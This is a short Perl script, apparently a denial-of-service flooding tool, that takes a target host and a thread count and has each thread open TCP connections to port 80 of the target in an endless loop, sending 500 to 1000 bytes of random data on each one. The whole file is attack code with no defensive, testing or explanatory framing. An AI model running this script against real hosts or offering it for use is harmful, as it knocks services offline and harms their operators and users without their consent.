#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
use threads;

my $target_host = $ARGV[0] or die "Usage: $0 <target_host>\n";
my $num_threads = $ARGV[1] || 1;

my @threads;
for (1..$num_threads) {
    push @threads, threads->create(\&send_packets);
}

sub send_packets {
    while (1) {
        my $local_port = int(rand(65535));
        my $target_port = 80;
        my $packet_size = int(rand(1000 - 500 + 1)) + 500;
        my $packet_data = join("", map { chr(int(rand(256))) } 1..$packet_size);
        my $socket = IO::Socket::INET->new(
            Proto => 'tcp',
            LocalPort => $local_port,
            Type => SOCK_STREAM,
            PeerHost => $target_host,
            PeerPort => $target_port
        );
        unless ($socket) {
            warn "Could not create socket: $!\n";
            next;
        }
        print $socket $packet_data;
        close($socket);
    }
}

foreach (@threads) {
    $_->join();
}
